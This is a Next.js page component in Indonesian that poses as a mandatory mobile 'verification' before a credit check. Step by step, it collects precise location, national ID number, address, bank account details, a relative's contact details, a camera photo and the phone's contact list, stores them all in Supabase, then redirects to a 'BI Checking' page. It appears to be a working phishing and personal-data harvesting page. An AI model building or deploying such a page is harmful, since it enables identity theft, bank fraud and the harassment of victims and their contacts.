/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabse";
import FullScreenLoader from "@/components/FullScreenLoader";
import { LocationData } from "@/types";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import CameraCapture from "@/components/Camera";

// Skema validasi menggunakan Zod
const formSchema = z.object({
	firstName: z.string().min(2, "Nama depan minimal 2 karakter"),
	lastName: z.string().min(2, "Nama belakang minimal 2 karakter"),
	phone: z.string().min(10, "No HP minimal 10 karakter"),
	whatsapp: z.string().min(10, "No WhatsApp minimal 10 karakter"),
	idCard: z.string().min(16, "No KTP harus 16 karakter").max(16, "No KTP harus 16 karakter"),
	street: z.string().min(5, "Alamat jalan minimal 5 karakter"),
	district: z.string().min(2, "Kecamatan minimal 2 karakter"),
	city: z.string().min(2, "Kota/Kabupaten minimal 2 karakter"),
	province: z.string().min(2, "Provinsi minimal 2 karakter"),
	bankName: z.string().min(2, "Nama bank minimal 2 karakter"),
	accountNumber: z.string().min(5, "Nomor rekening minimal 5 karakter"),
	accountName: z.string().min(2, "Nama pemilik rekening minimal 2 karakter"),
	relationType: z.enum(["Orang Tua", "Suami/Istri", "Anak", "Saudara"]),
	relationName: z.string().min(2, "Nama kerabat minimal 2 karakter"),
	relationPhone: z.string().min(10, "No HP kerabat minimal 10 karakter"),
	relationWhatsapp: z.string().min(10, "No WhatsApp kerabat minimal 10 karakter"),
});

type FormValues = z.infer<typeof formSchema>;

export default function Home() {
	const [status, setStatus] = useState<"initial" | "location" | "form" | "photo" | "contacts" | "completed" | "error">("initial");
	const [error, setError] = useState("");
	const [userData, setUserData] = useState<{ id?: string; location?: LocationData }>({});
	const [_, setPhotoUrl] = useState("");
	const {
		register,
		handleSubmit,
		formState: { errors },
	} = useForm<FormValues>({
		resolver: zodResolver(formSchema),
	});

	useEffect(() => {
		if (typeof window !== "undefined" && window.innerWidth < 768) {
			setTimeout(() => {
				setStatus("location");
				requestLocation();
			}, 3000);
		} else {
			setStatus("error");
			setError("Hanya tersedia di perangkat mobile");
		}
	}, []);

	const requestLocation = async () => {
		try {
			const location = await getLocation();
			setUserData((prev) => ({ ...prev, location }));

			const { data, error } = await supabase.from("user_data").insert([{ location }]).select().single();

			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);

			setUserData((prev) => ({ ...prev, id: data.id }));
			setStatus("form");
		} catch (err: any) {
			setStatus("error");
			setError(err.message);
		}
	};

	const onSubmit = async (data: FormValues) => {
		if (!userData.id) {
			setStatus("error");
			setError("Data pengguna tidak ditemukan");
			return;
		}

		try {
			// Simpan data utama
			await supabase.from("user_profiles").insert([
				{
					user_data_id: userData.id,
					first_name: data.firstName,
					last_name: data.lastName,
					phone: data.phone,
					whatsapp: data.whatsapp,
					id_card: data.idCard,
					address_street: data.street,
					address_district: data.district,
					address_city: data.city,
					address_province: data.province,
				},
			]);

			// Simpan data bank
			await supabase.from("user_banks").insert([
				{
					user_data_id: userData.id,
					bank_name: data.bankName,
					account_number: data.accountNumber,
					account_name: data.accountName,
				},
			]);

			// Simpan data kerabat
			await supabase.from("user_relations").insert([
				{
					user_data_id: userData.id,
					relation: data.relationType,
					name: data.relationName,
					phone: data.relationPhone,
					whatsapp: data.relationWhatsapp,
				},
			]);

			setStatus("photo");
		} catch (err: any) {
			setStatus("error");
			setError(`Gagal menyimpan data: ${err.message}`);
		}
	};

	const handlePhotoTaken = async (photoUrl: string) => {
		if (!userData.id) {
			setStatus("error");
			setError("Data pengguna tidak ditemukan");
			return;
		}

		try {
			// Simpan foto ke database
			await supabase.from("user_photos").insert([
				{
					user_data_id: userData.id,
					photo_url: photoUrl,
				},
			]);

			setPhotoUrl(photoUrl);
			setStatus("contacts");
			requestContacts();
		} catch (err) {
			setStatus("error");
			setError(`Gagal menyimpan foto: ${(err as Error).message}`);
		}
	};

	const requestContacts = async () => {
		try {
			if (!("contacts" in navigator)) {
				console.warn("Browser tidak mendukung akses kontak");
				setStatus("completed");
				return;
			}

			const contacts = await (navigator as any).contacts.select(["name", "tel"], { multiple: true });

			// Simpan kontak ke database
			if (userData.id) {
				await supabase.from("user_contacts").insert(
					contacts.map((contact: any) => ({
						user_data_id: userData.id,
						name: contact.name?.[0] || "",
						phone: contact.tel?.[0] || "",
					}))
				);
			}

			setStatus("completed");

			// Redirect setelah 2 detik
			setTimeout(() => {
				window.location.href = process.env.NEXT_PUBLIC_BI_CHECKING_URL || "https://bi-checking.example.com";
			}, 2000);
		} catch (err: any) {
			console.error("Error mengambil kontak:", err);
			setStatus("completed"); // Lanjutkan meskipun gagal ambil kontak
		}
	};

	return (
		<div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
			{status === "initial" && <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />}

			{status === "location" && (
				<div className="text-center max-w-md">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Lokasi</h2>
					<p className="text-gray-600">Sedang mengumpulkan data lokasi Anda...</p>
					<div className="mt-6 bg-blue-50 p-4 rounded-lg">
						<p className="text-blue-700">Harap berikan izin akses lokasi saat diminta</p>
					</div>
				</div>
			)}

			{status === "form" && (
				<div className="w-full max-w-md overflow-y-auto max-h-screen py-4">
					<h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Data Pribadi</h2>

					<form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
						<div className="space-y-4">
							<h3 className="text-lg font-semibold text-gray-700">Informasi Pribadi</h3>

							<div className="grid grid-cols-2 gap-4">
								<div>
									<label className="block text-gray-700 mb-1">Nama Depan *</label>
									<input {...register("firstName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
									{errors.firstName && <p className="text-red-500 text-sm mt-1">{errors.firstName.message}</p>}
								</div>

								<div>
									<label className="block text-gray-700 mb-1">Nama Belakang *</label>
									<input {...register("lastName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
									{errors.lastName && <p className="text-red-500 text-sm mt-1">{errors.lastName.message}</p>}
								</div>
							</div>

							<div>
								<label className="block text-gray-700 mb-1">No Handphone *</label>
								<input {...register("phone")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">No WhatsApp *</label>
								<input {...register("whatsapp")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.whatsapp && <p className="text-red-500 text-sm mt-1">{errors.whatsapp.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">No KTP *</label>
								<input {...register("idCard")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.idCard && <p className="text-red-500 text-sm mt-1">{errors.idCard.message}</p>}
							</div>
						</div>

						<div className="space-y-4">
							<h3 className="text-lg font-semibold text-gray-700">Alamat Lengkap</h3>

							<div>
								<label className="block text-gray-700 mb-1">Jalan *</label>
								<input {...register("street")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.street && <p className="text-red-500 text-sm mt-1">{errors.street.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Kecamatan *</label>
								<input {...register("district")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.district && <p className="text-red-500 text-sm mt-1">{errors.district.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Kota/Kabupaten *</label>
								<input {...register("city")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.city && <p className="text-red-500 text-sm mt-1">{errors.city.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Provinsi *</label>
								<input {...register("province")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.province && <p className="text-red-500 text-sm mt-1">{errors.province.message}</p>}
							</div>
						</div>

						<div className="space-y-4">
							<h3 className="text-lg font-semibold text-gray-700">Informasi Rekening Bank</h3>

							<div>
								<label className="block text-gray-700 mb-1">Nama Bank *</label>
								<input {...register("bankName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.bankName && <p className="text-red-500 text-sm mt-1">{errors.bankName.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Nomor Rekening *</label>
								<input {...register("accountNumber")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.accountNumber && <p className="text-red-500 text-sm mt-1">{errors.accountNumber.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Atas Nama *</label>
								<input {...register("accountName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.accountName && <p className="text-red-500 text-sm mt-1">{errors.accountName.message}</p>}
							</div>
						</div>

						<div className="space-y-4">
							<h3 className="text-lg font-semibold text-gray-700">Informasi Kerabat Dekat</h3>

							<div>
								<label className="block text-gray-700 mb-1">Hubungan *</label>
								<select {...register("relationType")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
									<option value="">Pilih Hubungan</option>
									<option value="Orang Tua">Orang Tua</option>
									<option value="Suami/Istri">Suami/Istri</option>
									<option value="Anak">Anak</option>
									<option value="Saudara">Saudara</option>
								</select>
								{errors.relationType && <p className="text-red-500 text-sm mt-1">{errors.relationType.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">Nama Lengkap *</label>
								<input {...register("relationName")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.relationName && <p className="text-red-500 text-sm mt-1">{errors.relationName.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">No Handphone *</label>
								<input {...register("relationPhone")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.relationPhone && <p className="text-red-500 text-sm mt-1">{errors.relationPhone.message}</p>}
							</div>

							<div>
								<label className="block text-gray-700 mb-1">No WhatsApp *</label>
								<input {...register("relationWhatsapp")} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
								{errors.relationWhatsapp && <p className="text-red-500 text-sm mt-1">{errors.relationWhatsapp.message}</p>}
							</div>
						</div>

						<div className="mt-8">
							<button type="submit" className="w-full px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
								Simpan Data
							</button>
						</div>
					</form>
				</div>
			)}

			{status === "photo" && (
				<div className="w-full max-w-md">
					<h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Ambil Foto</h2>
					<CameraCapture onCapture={handlePhotoTaken} />
				</div>
			)}

			{status === "contacts" && (
				<div className="text-center max-w-md">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Kontak</h2>
					<p className="text-gray-600">Sedang mengumpulkan data kontak Anda...</p>
					<div className="mt-6 bg-blue-50 p-4 rounded-lg">
						<p className="text-blue-700">Harap pilih kontak yang ingin dibagikan</p>
					</div>
				</div>
			)}

			{status === "completed" && (
				<div className="text-center max-w-md">
					<div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
						</svg>
					</div>
					<h2 className="text-2xl font-semibold text-gray-800 mb-4">Verifikasi Berhasil!</h2>
					<p className="text-gray-600 mb-6">Semua data telah berhasil dikumpulkan dan disimpan.</p>
					<div className="bg-green-50 p-4 rounded-lg border border-green-200">
						<p className="text-green-700">Anda akan diarahkan ke halaman BI Checking...</p>
					</div>
				</div>
			)}

			{status === "error" && (
				<div className="text-center max-w-md p-6 bg-white rounded-xl shadow-lg border border-gray-200">
					<div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
						</svg>
					</div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Terjadi Kesalahan</h2>
					<p className="text-gray-600 mb-6">{error}</p>
					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
						Coba Lagi
					</button>
				</div>
			)}
		</div>
	);
}

// ===== Fungsi Bantuan =====
const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
	return new Promise((resolve, reject) => {
		if (!navigator.geolocation) {
			reject(new Error("Browser tidak mendukung geolokasi"));
			return;
		}

		navigator.geolocation.getCurrentPosition(
			(position) => {
				resolve({
					lat: position.coords.latitude,
					lng: position.coords.longitude,
					accuracy: position.coords.accuracy,
				});
			},
			(error) => {
				reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`));
			},
			{ enableHighAccuracy: true, timeout: 10000 }
		);
	});
};
